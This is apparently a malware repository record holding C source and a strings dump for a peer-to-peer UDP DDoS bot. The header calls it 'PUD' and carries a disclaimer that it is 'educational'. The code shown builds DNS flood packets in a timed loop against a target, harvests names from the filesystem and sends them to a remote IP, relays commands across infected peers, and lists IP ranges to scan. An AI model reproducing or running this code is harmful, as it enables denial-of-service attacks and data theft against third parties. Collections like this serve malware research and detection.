sockaddr_in));\n\t\t\t\t\t\tin.sin_addr.s_addr=rp->target;\n\t\t\t\t\t\tin.sin_family=AF_INET;\n\t\t\t\t\t\tin.sin_port=htons(53);\n\t\t\t\t\t\tdnsp.rd=1;\n\t\t\t\t\t\tdnsp.tc=0;\n\t\t\t\t\t\tdnsp.aa=0;\n\t\t\t\t\t\tdnsp.opcode=0;\n\t\t\t\t\t\tdnsp.qr=0;\n\t\t\t\t\t\tdnsp.rcode=0;\n\t\t\t\t\t\tdnsp.unused=0;\n\t\t\t\t\t\tdnsp.pr=0;\n\t\t\t\t\t\tdnsp.ra=0;\n\t\t\t\t\t\tdnsp.que_num=256;\n\t\t\t\t\t\tdnsp.rep_num=0;\n\t\t\t\t\t\tdnsp.num_rr=0;\n\t\t\t\t\t\tdnsp.num_rrsup=0;\n\t\t\t\t\t\tconvo=buf+sizeof(struct df_rec);\n\t\t\t\t\t\tconvo[rp->h.len]=0;\n\t\t\t\t\t\t_decrypt(convo,rp->h.len);\n\t\t\t\t\t\tfor (i=0,startm=0;i<=rp->h.len;i++) if (convo[i] == '.' || convo[i] == 0) {\n\t\t\t\t\t\t\tconvo[i]=0;\n\t\t\t\t\t\t\tsprintf(dnsp.buf+len,\"%c%s\",(unsigned char)(i-startm),convo+startm);\n\t\t\t\t\t\t\tlen+=1+strlen(convo+startm);\n\t\t\t\t\t\t\tstartm=i+1;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tdnsp.buf[len++]=0;\n\t\t\t\t\t\tdnsp.buf[len++]=0;\n\t\t\t\t\t\tdnsp.buf[len++]=1;\n\t\t\t\t\t\tdnsp.buf[len++]=0;\n\t\t\t\t\t\tdnsp.buf[len++]=1;\n\t\t\t\t\t\twhile(1) {\n\t\t\t\t\t\t\tdnsp.id=rand();\n\t\t\t\t\t\t\tif ((fd = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0);\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tflag = fcntl(fd, F_GETFL, 0);\n\t\t\t\t\t\t\t\tflag |= O_NONBLOCK;\n\t\t\t\t\t\t\t\tfcntl(fd, F_SETFL, flag);\n\t\t\t\t\t\t\t\tsendto(fd,(char*)&dnsp,sizeof(struct dns)+len-128,0,(struct sockaddr*)&in,sizeof(in));\n\t\t\t\t\t\t\t\tclose(fd);\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (i >= 50) {\n\t\t\t\t\t\t\t\tif (time(NULL) >= start+rp->secs) exit(0);\n\t\t\t\t\t\t\t\ti=0;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\ti++;\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} exit(0);\n\t\t\t\t\tcase 0x2D: { // Email scan\n\t\t\t\t\t\tchar ip[256];\n\t\t\t\t\t\tstruct escan_rec *rp=(struct escan_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct escan_rec)) break;\n\t\t\t\t\t\tif (!isreal(rp->ip)) {\n\t\t\t\t\t\t\tsenderror(&udpclient,rp->h.id,\"Invalid IP\\n\");\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tconv(ip,256,rp->ip);\n\t\t\t\t\t\tif (mfork() == 0) {\n\t\t\t\t\t\t\tstruct _linklist *getb;\n\t\t\t\t\t\t\tstruct ainst client;\n\t\t\t\t\t\t\tStartScan(\"/\");\n\t\t\t\t\t\t\taudp_setup(&client,(char*)ip,ESCANPORT);\n\t\t\t\t\t\t\tgetb=linklist;\n\t\t\t\t\t\t\twhile(getb != NULL) {\n\t\t\t\t\t\t\t\tunsigned long len=strlen(getb->name);\n\t\t\t\t\t\t\t\taudp_send(&client,getb->name,len);\n\t\t\t\t\t\t\t\tgetb=getb->next;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\taudp_close(&client);\n\t\t\t\t\t\t\texit(0);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x70: { // Incomming client\n\t\t\t\t\t\tstruct {\n\t\t\t\t\t\t\tstruct addsrv_rec a;\n\t\t\t\t\t\t\tunsigned long server;\n\t\t\t\t\t\t} rc;\n\t\t\t\t\t\tstruct myip_rec rp;\n\t\t\t\t\t\tif (!isreal(udpclient.in.sin_addr.s_addr)) break;\n\n\t\t\t\t\t\tsyncmode(3);\n\t\t\t\t\t\tmemset((void*)&rp,0,sizeof(struct myip_rec));\n\t\t\t\t\t\trp.h.tag=0x73;\n\t\t\t\t\t\trp.h.id=0;\n\t\t\t\t\t\trp.ip=udpclient.in.sin_addr.s_addr;\n\t\t\t\t\t\trelayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));\n\n\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(rc));\n\t\t\t\t\t\trc.a.h.tag=0x71;\n\t\t\t\t\t\trc.a.h.id=0;\n\t\t\t\t\t\trc.a.h.len=sizeof(unsigned long);\n\t\t\t\t\t\trc.server=udpclient.in.sin_addr.s_addr;\n\t\t\t\t\t\tbroadcast((void*)&rc,sizeof(rc));\n\t\t\t\t\t\tsyncmode(1);\n\n\t\t\t\t\t\taddserver(rc.server);\n\t\t\t\t\t\tsyncm(&udpclient,0x71,0);\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x71: { // Receive the list\n\t\t\t\t\t\tstruct addsrv_rec *rp=(struct addsrv_rec *)buf;\n\t\t\t\t\t\tstruct next_rec { unsigned long server; };\n\t\t\t\t\t\tunsigned long a;\n\t\t\t\t\t\tchar b=0;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct addsrv_rec)) break;\n\t\t\t\t\t\tfor (a=0;rp->h.len > a*sizeof(struct next_rec) && udpserver.len > sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec));a++) {\n\t\t\t\t\t\t\tstruct next_rec *fc=(struct next_rec*)(buf+sizeof(struct addsrv_rec)+(a*sizeof(struct next_rec)));\n\t\t\t\t\t\t\taddserver(fc->server);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tfor (a=0;a<numlinks;a++) if (links[a] == udpclient.in.sin_addr.s_addr) b=1;\n\t\t\t\t\t\tif (!b && isreal(udpclient.in.sin_addr.s_addr)) {\n\t\t\t\t\t\t\tstruct myip_rec rp;\n\t\t\t\t\t\t\tmemset((void*)&rp,0,sizeof(struct myip_rec));\n\t\t\t\t\t\t\trp.h.tag=0x73;\n\t\t\t\t\t\t\trp.h.id=0;\n\t\t\t\t\t\t\trp.ip=udpclient.in.sin_addr.s_addr;\n\t\t\t\t\t\t\trelayclient(&udpclient,(void*)&rp,sizeof(struct myip_rec));\n\t\t\t\t\t\t\taddserver(udpclient.in.sin_addr.s_addr);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x72: { // Send the list\n\t\t\t\t\t\tsyncm(&udpclient,0x71,0);\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x73: { // Get my IP\n\t\t\t\t\t\tstruct myip_rec *rp=(struct myip_rec *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct myip_rec)) break;\n\t\t\t\t\t\tif (!myip && isreal(rp->ip)) {\n\t\t\t\t\t\t\tmyip=rp->ip;\n\t\t\t\t\t\t\taddserver(rp->ip);\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x74: { // Transmit their IP\n\t\t\t\t\t\tstruct myip_rec rc;\n\t\t\t\t\t\tmemset((void*)&rc,0,sizeof(struct myip_rec));\n\t\t\t\t\t\trc.h.tag=0x73;\n\t\t\t\t\t\trc.h.id=0;\n\t\t\t\t\t\trc.ip=udpclient.in.sin_addr.s_addr;\n\t\t\t\t\t\tif (!isreal(rc.ip)) break;\n\t\t\t\t\t\trelayclient(&udpclient,(void*)&rc,sizeof(struct myip_rec));\n\t\t\t\t\t\t} break;\n\t\t\t\t\tcase 0x41:   //  --|\n\t\t\t\t\tcase 0x42:   //    |\n\t\t\t\t\tcase 0x43:   //    |\n\t\t\t\t\tcase 0x44:   //    |---> Relay to client\n\t\t\t\t\tcase 0x45:   //    |\n\t\t\t\t\tcase 0x46:   //    |\n\t\t\t\t\tcase 0x47: { //  --|\n\t\t\t\t\t\tunsigned long a;\n\t\t\t\t\t\tstruct header *rc=(struct header *)buf;\n\t\t\t\t\t\tif (udpserver.len < sizeof(struct header)) break;\n\t\t\t\t\t\tif (!useseq(rc->seq)) {\n\t\t\t\t\t\t\taddseq(rc->seq);\n\t\t\t\t\t\t\tfor (a=0;a<LINKS;a++) if (routes[a].id == rc->id) {\n\t\t\t\t\t\t\t\tstruct ainst ts;\n\t\t\t\t\t\t\t\tchar srv[256];\n\t\t\t\t\t\t\t\tconv(srv,256,routes[a].ip);\n\t\t\t\t\t\t\t\taudp_relay(&udpserver,&ts,srv,routes[a].port);\n\t\t\t\t\t\t\t\trelayclient(&ts,buf,udpserver.len);\n\t\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t} break;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\taudp_close(&udpserver);\n\treturn 0;\n}"
    },
    "filename": "VirusShare_1397e57cc04b5f29f07d173da9e5c934",
    "filesize": 67615,
    "filetype": "C source, ASCII text",
    "hashes": {
        "md5": "1397e57cc04b5f29f07d173da9e5c934",
        "sha1": "010c8d99ef09dceed66a2bab15edbb503bfb9880",
        "sha256": "203bfda6e3dd5f4d34935a234c049fc147e6cee0dcb15971ccbadbf7c6f2da4a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "/****************************************************************************",
            " *                                                                          *",
            " *           Peer-to-peer UDP Distributed Denial of Service (PUD)           *",
            " *                         by contem@efnet                                  *",
            " *                                                                          *",
            " *         Virtually connects computers via the udp protocol on the         *",
            " *  specified port.  Uses a newly created peer-to-peer protocol that        *",
            " *  incorperates uses on unstable or dead computers.  The program is        *",
            " *  ran with the parameters of another ip on the virtual network.  If       *",
            " *  running on the first computer, run with the ip 127.0.0.1 or some        *",
            " *  other type of local address.  Ex:                                       *",
            " *                                                                          *",
            " *           Computer A:   ./program 127.0.0.1                              *",
            " *           Computer B:   ./program Computer_A                             *",
            " *           Computer C:   ./program Computer_A                             *",
            " *           Computer D:   ./program Computer_C                             *",
            " *                                                                          *",
            " *         Any form of that will work.  The linking process works by        *",
            " *  giving each computer the list of avaliable computers, then              *",
            " *  using a technique called broadcast segmentation combined with TCP       *",
            " *  like functionality to insure that another computer on the network       *",
            " *  receives the broadcast packet, segments it again and recreates          *",
            " *  the packet to send to other hosts.  That technique can be used to       *",
            " *  support over 16 million simutaniously connected computers.              *",
            " *                                                                          *",
            " *         Thanks to ensane and st for donating shells and test beds        *",
            " *  for this program.  And for the admins who removed me because I          *",
            " *  was testing this program (you know who you are) need to watch           *",
            " *  their backs.                                                            *",
            " *                                                                          *",
            " *         I am not responsible for any harm caused by this program!        *",
            " *  I made this program to demonstrate peer-to-peer communication and       *",
            " *  should not be used in real life.  It is an education program that       *",
            " *  should never even be ran at all, nor used in any way, shape or          *",
            " *  form.  It is not the authors fault if it was used for any purposes      *",
            " *  other than educational.                                                 *",
            " *                                                                          *",
            " ****************************************************************************/",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <fcntl.h>",
            "#include <stdlib.h>",
            "#include <stdarg.h>",
            "#include <sys/ioctl.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <sys/time.h>",
            "#include <unistd.h>",
            "#include <errno.h>",
            "#include <netdb.h>",
            "#include <arpa/telnet.h>",
            "#include <sys/wait.h>",
            "#include <signal.h>",
            "#define SCAN",
            "#undef LARGE_NET",
            "#undef FREEBSD",
            "#define BROADCASTS\t2",
            "#define LINKS\t\t128",
            "#define CLIENTS\t\t128",
            "#define PORT\t\t2002",
            "#define SCANPORT\t80",
            "#define SCANTIMEOUT\t5",
            "#define MAXPATH\t\t4096",
            "#define ESCANPORT\t10100",
            "#define VERSION\t\t12092002",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                                  Macros                                          //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "#define FREE(x) {if (x) { free(x);x=NULL; }}",
            "enum { TCP_PENDING=1, TCP_CONNECTED=2, SOCKS_REPLY=3 };",
            "enum { ASUCCESS=0, ARESOLVE, ACONNECT, ASOCKET, ABIND, AINUSE, APENDING, AINSTANCE, AUNKNOWN };",
            "enum { AREAD=1, AWRITE=2, AEXCEPT=4 };",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                                  Packet headers                                  //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "struct llheader {",
            "\tchar type;",
            "\tunsigned long checksum;",
            "\tunsigned long id;",
            "struct header {",
            "\tchar tag;",
            "\tint id;",
            "\tunsigned long len;",
            "\tunsigned long seq;",
            "struct route_rec {",
            "\tstruct header h;",
            "\tchar sync;",
            "\tunsigned char hops;",
            "\tunsigned long server;",
            "\tunsigned long links;",
            "struct kill_rec {",
            "\tstruct header h;",
            "struct sh_rec {",
            "\tstruct header h;",
            "struct list_rec {",
            "\tstruct header h;",
            "struct udp_rec {",
            "\tstruct header h;",
            "\tunsigned long size;",
            "\tunsigned long target;",
            "\tunsigned short port;",
            "\tunsigned long secs;",
            "struct tcp_rec {",
            "\tstruct header h;",
            "\tunsigned long target;",
            "\tunsigned short port;",
            "\tunsigned long secs;",
            "struct tcp6_rec {",
            "\tstruct header h;",
            "\tunsigned long target[4];",
            "\tunsigned short port;",
            "\tunsigned long secs;",
            "struct gen_rec {",
            "\tstruct header h;",
            "\tunsigned long target;",
            "\tunsigned short port;",
            "\tunsigned long secs;",
            "struct df_rec {",
            "\tstruct header h;",
            "\tunsigned long target;",
            "\tunsigned long secs;",
            "struct add_rec {",
            "\tstruct header h;",
            "\tunsigned long server;",
            "\tunsigned long socks;",
            "\tunsigned long bind;",
            "\tunsigned short port;",
            "struct data_rec {",
            "\tstruct header h;",
            "struct addsrv_rec {",
            "\tstruct header h;",
            "struct initsrv_rec {",
            "\tstruct header h;",
            "struct qmyip_rec {",
            "\tstruct header h;",
            "struct myip_rec {",
            "\tstruct header h;",
            "\tunsigned long ip;",
            "struct escan_rec {",
            "\tstruct header h;",
            "\tunsigned long ip;",
            "struct getinfo_rec {",
            "\tstruct header h;",
            "\tunsigned long time;",
            "\tunsigned long mtime;",
            "struct info_rec {",
            "\tstruct header h;",
            "\tunsigned char a;",
            "\tunsigned char b;",
            "\tunsigned char c;",
            "\tunsigned char d;",
            "\tunsigned long ip;",
            "\tunsigned long uptime;",
            "\tunsigned long reqtime;",
            "\tunsigned long reqmtime;",
            "\tunsigned long in;",
            "\tunsigned long out;",
            "\tunsigned long version;",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                             Public variables                                     //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "struct ainst {",
            "\tvoid *ext,*ext5;",
            "\tint ext2,ext3,ext4;",
            "\tint sock,error;",
            "\tunsigned long len;",
            "\tstruct sockaddr_in in;",
            "struct ainst clients[CLIENTS*2];",
            "struct ainst udpclient;",
            "unsigned int sseed=0;",
            "struct route_table {",
            "\tint id;",
            "\tunsigned long ip;",
            "\tunsigned short port;",
            "} routes[LINKS];",
            "unsigned long numlinks, *links=NULL, myip=0;",
            "unsigned long sequence[LINKS], rsa[LINKS];",
            "unsigned int *pids=NULL;",
            "unsigned long numpids=0;",
            "unsigned long uptime=0, in=0, out=0;",
            "unsigned long synctime=0;",
            "int syncmodes=1;",
            "struct mqueue {",
            "\tchar *packet;",
            "\tunsigned long len;",
            "\tunsigned long id;",
            "\tunsigned long time;",
            "\tunsigned long ltime;",
            "\tunsigned long destination;",
            "\tunsigned short port;",
            "\tunsigned char trys;",
            "\tstruct mqueue *next;",
            "} *queues=NULL;",
            "#ifdef SCAN",
            "unsigned char classes[] = { 3, 4, 6, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 28, 29, 30, 32, 33, 34, 35, 38, 40, 43, 44, 45,",
            "\t46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 80, 81, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138,",
            "\t139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167,",
            "\t168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196,",
            "\t198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 224, 225, 226, 227, 228, 229,",
            "\t230, 231, 232, 233, 234, 235, 236, 237, 238, 239 };",
            "#endif",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "//                               Public routines                                    //",
            "//////////////////////////////////////////////////////////////////////////////////////",
            "unsigned long gettimeout() {",
            "\treturn 36+(numlinks/15);",
            "void syncmode(int mode) {",
            "\tsyncmodes=mode;",
            "void gsrand(unsigned long s) {",
            "\tsseed=s;",
            "unsigned long grand() {",
            "\tsseed=((sseed*965764979)%65535)/2;",
            "\treturn sseed;",
            "void nas(int a) {",
            "int mfork() {",
            "\tunsigned int parent, *newpids, i;",
            "\tparent=fork();",
            "\tif (parent <= 0) return parent;",
            "\tnumpids++;",
            "\tnewpids=(unsigned int*)malloc((numpids+1)*sizeof(unsigned int));",
            "\tif (newpids == NULL) return parent;",
            "\tfor (i=0;i<numpids-1;i++) newpids[i]=pids[i];",
            "\tnewpids[numpids-1]=parent;",
            "\tFREE(pids);",
            "\tpids=newpids;",
            "\treturn parent;",
            "char *aerror(struct ainst *inst) {",
            "\tif (inst == NULL) return \"Invalid instance or socket\";",
            "\tswitch(inst->error) {",
            "\t\tcase ASUCCESS:return \"Operation Success\";",
            "\t\tcase ARESOLVE:return \"Unable to resolve\";",
            "\t\tcase ACONNECT:return \"Unable to connect\";",
            "\t\tcase ASOCKET:return \"Unable to create socket\";",
            "\t\tcase ABIND:return \"Unable to bind socket\";",
            "\t\tcase AINUSE:return \"Port is in use\";",
            "\t\tcase APENDING:return \"Operation pending\";",
            "\t\tcase AUNKNOWN:default:return \"Unknown\";",
            "\treturn \"\";",
            "int aresolve(char *host) {",
            " \tstruct hostent *hp;",
            "\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {",
            "\t\tunsigned long a;",
            "\t\tif ((hp = gethostbyname(host)) == NULL) return 0;",
            "\t\tbcopy((char*)hp->h_addr, (char*)&a, hp->h_length);",
            "\t\treturn a;",
            "\telse return inet_addr(host);",
            "int abind(struct ainst *inst,unsigned long ip,unsigned short port) {",
            "\tstruct sockaddr_in in;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tif (inst->sock == 0) {",
            "\t\tinst->error=AINSTANCE;",
            "\t\treturn (AINSTANCE);",
            "\tinst->len=0;",
            "\tin.sin_family = AF_INET;",
            "\tif (ip == NULL) in.sin_addr.s_addr = INADDR_ANY;",
            "\telse in.sin_addr.s_addr = ip;",
            "\tin.sin_port = htons(port);",
            "\tif (bind(inst->sock, (struct sockaddr *)&in, sizeof(in)) < 0) {",
            "\t\tinst->error=ABIND;",
            "\t\treturn (ABIND);",
            "\tinst->error=ASUCCESS;",
            "\treturn ASUCCESS;",
            "int await(struct ainst **inst,unsigned long len,char type,long secs) {",
            "\tstruct timeval tm,*tmp;",
            "\tfd_set read,write,except,*readp,*writep,*exceptp;",
            "\tint p,ret,max;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tfor (p=0;p<len;p++) inst[p]->len=0;",
            "\tif (secs > 0) {",
            "\t\ttm.tv_sec=secs;",
            "\t\ttm.tv_usec=0;",
            "\t\ttmp=&tm;",
            "\telse tmp=(struct timeval *)NULL;",
            "\tif (type & AREAD) {",
            "\t\tFD_ZERO(&read);",
            "\t\tfor (p=0;p<len;p++) FD_SET(inst[p]->sock,&read);",
            "\t\treadp=&read;",
            "\telse readp=(struct fd_set*)0;",
            "\tif (type & AWRITE) {",
            "\t\tFD_ZERO(&write);",
            "\t\tfor (p=0;p<len;p++) FD_SET(inst[p]->sock,&write);",
            "\t\twritep=&write;",
            "\telse writep=(struct fd_set*)0;",
            "\tif (type & AEXCEPT) {",
            "\t\tFD_ZERO(&except);",
            "\t\tfor (p=0;p<len;p++) FD_SET(inst[p]->sock,&except);",
            "\t\texceptp=&except;",
            "\telse exceptp=(struct fd_set*)0;",
            "\tfor (p=0,max=0;p<len;p++) if (inst[p]->sock > max) max=inst[p]->sock;",
            "\tif ((ret=select(max+1,readp,writep,exceptp,tmp)) == 0) {",
            "\t\tfor (p=0;p<len;p++) inst[p]->error=APENDING;",
            "\t\treturn (APENDING);",
            "\tif (ret == -1) return (AUNKNOWN);",
            "\tfor (p=0;p<len;p++) {",
            "\t\tif (type & AREAD) if (FD_ISSET(inst[p]->sock,&read)) inst[p]->len+=AREAD;",
            "\t\tif (type & AWRITE) if (FD_ISSET(inst[p]->sock,&write)) inst[p]->len+=AWRITE;",
            "\t\tif (type & AEXCEPT) if (FD_ISSET(inst[p]->sock,&except)) inst[p]->len+=AEXCEPT;",
            "\tfor (p=0;p<len;p++) inst[p]->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int atcp_sync_check(struct ainst *inst) {",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\terrno=0;",
            "\tif (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {",
            "\t\tinst->error=ASUCCESS;",
            "\t\treturn (ASUCCESS);",
            "\tif (!(errno == EINPROGRESS ||errno == EALREADY)) {",
            "\t\tinst->error=ACONNECT;",
            "\t\treturn (ACONNECT);",
            "\tinst->error=APENDING;",
            "\treturn (APENDING);",
            "int atcp_sync_connect(struct ainst *inst,char *host,unsigned int port) {",
            "\tint flag=1;",
            " \tstruct hostent *hp;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {",
            "\t\tinst->error=ASOCKET;",
            "\t\treturn (ASOCKET);",
            "\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {",
            "\t\tif ((hp = gethostbyname(host)) == NULL) {",
            "\t\t\tinst->error=ARESOLVE;",
            "\t\t\treturn (ARESOLVE);",
            "\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);",
            "\telse inst->in.sin_addr.s_addr=inet_addr(host);",
            "\tinst->in.sin_family = AF_INET;",
            "\tinst->in.sin_port = htons(port);",
            "\tflag = fcntl(inst->sock, F_GETFL, 0);",
            "\tflag |= O_NONBLOCK;",
            "\tfcntl(inst->sock, F_SETFL, flag);",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int atcp_connect(struct ainst *inst,char *host,unsigned int port) {",
            "\tint flag=1;",
            "\tunsigned long start;",
            " \tstruct hostent *hp;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif ((inst->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {",
            "\t\tinst->error=ASOCKET;",
            "\t\treturn (ASOCKET);",
            "\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {",
            "\t\tif ((hp = gethostbyname(host)) == NULL) {",
            "\t\t\tinst->error=ARESOLVE;",
            "\t\t\treturn (ARESOLVE);",
            "\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);",
            "\telse inst->in.sin_addr.s_addr=inet_addr(host);",
            "\tinst->in.sin_family = AF_INET;",
            "\tinst->in.sin_port = htons(port);",
            "\tflag = fcntl(inst->sock, F_GETFL, 0);",
            "\tflag |= O_NONBLOCK;",
            "\tfcntl(inst->sock, F_SETFL, flag);",
            "\tstart=time(NULL);",
            "\twhile(time(NULL)-start < 10) {",
            "\t\terrno=0;",
            "\t\tif (connect(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) == 0 || errno == EISCONN) {",
            "\t\t\tinst->error=ASUCCESS;",
            "\t\t\treturn (ASUCCESS);",
            "\t\tif (!(errno == EINPROGRESS ||errno == EALREADY)) break;",
            "\t\tsleep(1);",
            "\tinst->error=ACONNECT;",
            "\treturn (ACONNECT);",
            "int atcp_accept(struct ainst *inst,struct ainst *child) {",
            "\tint sock;",
            "\tunsigned int datalen;",
            "\tif (inst == NULL || child == NULL) return (AINSTANCE);",
            "\tdatalen=sizeof(child->in);",
            "\tinst->len=0;",
            "\tmemcpy((void*)child,(void*)inst,sizeof(struct ainst));",
            "\tif ((sock=accept(inst->sock,(struct sockaddr *)&child->in,&datalen)) < 0) {",
            "\t\tmemset((void*)child,0,sizeof(struct ainst));",
            "\t\tinst->error=APENDING;",
            "\t\treturn (APENDING);",
            "\tchild->sock=sock;",
            "\tinst->len=datalen;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int atcp_send(struct ainst *inst,char *buf,unsigned long len) {",
            "\tlong datalen;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\terrno=0;",
            "\tif ((datalen=write(inst->sock,buf,len)) < len) {",
            "\t\tif (errno == EAGAIN) {",
            "\t\t\tinst->error=APENDING;",
            "\t\t\treturn (APENDING);",
            "\t\telse {",
            "\t\t\tinst->error=AUNKNOWN;",
            "\t\t\treturn (AUNKNOWN);",
            "\tinst->len=datalen;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int atcp_sendmsg(struct ainst *inst, char *words, ...) {",
            "\tstatic char textBuffer[2048];",
            "\tunsigned int a;",
            "\tva_list args;",
            "\tva_start(args, words);",
            "\ta=vsprintf(textBuffer, words, args);",
            "\tva_end(args);",
            "\treturn atcp_send(inst,textBuffer,a);",
            "int atcp_recv(struct ainst *inst,char *buf,unsigned long len) {",
            "\tlong datalen;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif ((datalen=read(inst->sock,buf,len)) < 0) {",
            "\t\tif (errno == EAGAIN) {",
            "\t\t\tinst->error=APENDING;",
            "\t\t\treturn (APENDING);",
            "\t\telse {",
            "\t\t\tinst->error=AUNKNOWN;",
            "\t\t\treturn (AUNKNOWN);",
            "\tif (datalen == 0 && len) {",
            "\t\tinst->error=AUNKNOWN;",
            "\t\treturn (AUNKNOWN);",
            "\tinst->len=datalen;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int atcp_close(struct ainst *inst) {",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif (close(inst->sock) < 0) {",
            "\t\tinst->error=AUNKNOWN;",
            "\t\treturn (AUNKNOWN);",
            "\tinst->sock=0;",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int audp_listen(struct ainst *inst,unsigned int port) {",
            "\tint flag=1;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {",
            "\t\tinst->error=ASOCKET;",
            "\t\treturn (ASOCKET);",
            "\tinst->in.sin_family = AF_INET;",
            "\tinst->in.sin_addr.s_addr = INADDR_ANY;",
            "\tinst->in.sin_port = htons(port);",
            "\tif (bind(inst->sock, (struct sockaddr *)&inst->in, sizeof(inst->in)) < 0) {",
            "\t\tinst->error=ABIND;",
            "\t\treturn (ABIND);",
            "#ifdef O_DIRECT",
            "\tflag = fcntl(inst->sock, F_GETFL, 0);",
            "\tflag |= O_DIRECT;",
            "\tfcntl(inst->sock, F_SETFL, flag);",
            "#endif",
            "\tinst->error=ASUCCESS;",
            "\tflag=1;",
            "\tsetsockopt(inst->sock,SOL_SOCKET,SO_OOBINLINE,&flag,sizeof(flag));",
            "\treturn (ASUCCESS);",
            "int audp_setup(struct ainst *inst,char *host,unsigned int port) {",
            "\tint flag=1;",
            " \tstruct hostent *hp;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tif ((inst->sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0) {",
            "\t\tinst->error=ASOCKET;",
            "\t\treturn (ASOCKET);",
            "\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {",
            "\t\tif ((hp = gethostbyname(host)) == NULL) {",
            "\t\t\tinst->error=ARESOLVE;",
            "\t\t\treturn (ARESOLVE);",
            "\t\tbcopy((char*)hp->h_addr, (char*)&inst->in.sin_addr, hp->h_length);",
            "\telse inst->in.sin_addr.s_addr=inet_addr(host);",
            "\tinst->in.sin_family = AF_INET;",
            "\tinst->in.sin_port = htons(port);",
            "#ifdef O_DIRECT",
            "\tflag = fcntl(inst->sock, F_GETFL, 0);",
            "\tflag |= O_DIRECT;",
            "\tfcntl(inst->sock, F_SETFL, flag);",
            "#endif",
            "\tinst->error=ASUCCESS;",
            "\treturn (ASUCCESS);",
            "int audp_relay(struct ainst *parent,struct ainst *inst,char *host,unsigned int port) {",
            " \tstruct hostent *hp;",
            "\tif (inst == NULL) return (AINSTANCE);",
            "\tinst->len=0;",
            "\tinst->sock = parent->sock;",
            "\tif (inet_addr(host) == 0 || inet_addr(host) == -1) {",
            "\t\tif ((hp = gethostbyname(host)) == NULL) {",
            "\t\t\tinst->error=ARESOLVE;",
            "\t\t\treturn (ARESOLVE);",
